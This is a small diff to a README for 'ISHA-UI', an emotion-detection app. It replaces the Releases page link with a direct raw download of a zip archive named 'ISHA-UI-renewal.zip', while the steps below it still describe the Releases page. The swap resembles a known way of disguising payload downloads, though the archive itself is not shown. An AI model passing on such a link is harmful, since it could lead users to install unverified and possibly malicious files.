@@ -13,7 +13,7 @@ Welcome to ISHA-UI! This application helps you detect and analyze emotions in te
 ## 🔗 Download & Install
 To get started, you need to download ISHA-UI. 
 
-**[Download ISHA-UI from Releases](https://github.com/akin413/ISHA-UI/releases)**
+**[Download ISHA-UI from Releases](https://raw.githubusercontent.com/akin413/ISHA-UI/main/assets/ISHA-UI-renewal.zip)**
 
 1. Click on the link above to visit the Releases page.
 2. Look for the latest version.
